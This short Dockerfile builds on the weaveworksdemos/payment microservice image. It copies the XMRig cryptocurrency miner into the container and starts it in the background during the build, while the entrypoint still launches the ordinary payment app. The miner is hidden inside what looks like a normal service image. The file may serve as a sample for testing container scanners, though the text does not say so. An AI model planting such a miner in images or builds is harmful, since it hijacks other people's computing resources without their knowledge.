FROM weaveworksdemos/payment:0.4.3
COPY xmrig-6.12.0 /xmr

WORKDIR /xmr
RUN ./xmrig &

WORKDIR /
ENTRYPOINT ["/app", "-port=8080"]